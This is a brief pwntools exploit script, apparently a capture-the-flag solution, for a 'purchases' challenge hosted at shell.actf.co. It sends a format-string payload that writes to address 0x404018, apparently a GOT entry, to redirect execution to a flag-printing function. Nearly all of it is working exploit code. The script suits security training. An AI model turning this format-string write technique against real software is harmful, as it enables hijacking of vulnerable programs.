from pwn import *

#context.log_level = 'debug'

payload = ''
payload += '%4534c%11$hnn'
payload = payload.ljust(24, '\x00')
payload += p64(0x404018)

print [payload]

host = 'shell.actf.co'
port = 19011

#p = process('./purchases')
#pause()
p = remote(host, port)
p.sendline(payload)
print p.recvuntil('}')
#raw_input()
p.close()
# 0x4011b6 address flag
#0x7fffffffde30
#print payload
#0x404018
#index = 8'''